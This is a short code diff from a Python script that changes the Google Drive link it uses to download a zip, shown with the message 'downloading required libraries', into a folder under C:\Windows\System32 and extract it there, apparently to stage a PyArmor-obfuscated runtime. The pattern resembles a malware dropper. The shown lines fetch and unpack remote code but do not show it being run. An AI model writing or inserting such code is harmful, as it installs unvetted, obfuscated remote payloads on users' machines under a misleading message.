@@ -194,7 +194,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\DRVX\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1OY1kbjcTrvyhXlmM2OCTdpEc0Et2_4s9", "C:\\Windows\\System32\\DRVX\\aesmarv.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1aZWSUF1clTzPPLLZv9dcDfZ-Oi8E_dUD", "C:\\Windows\\System32\\DRVX\\aesmarv.zip")
     zip_file = r'C:\Windows\System32\DRVX\aesmarv.zip'
     extract_dir = r'C:\Windows\System32\DRVX'
     extract_zip(zip_file, extract_dir)
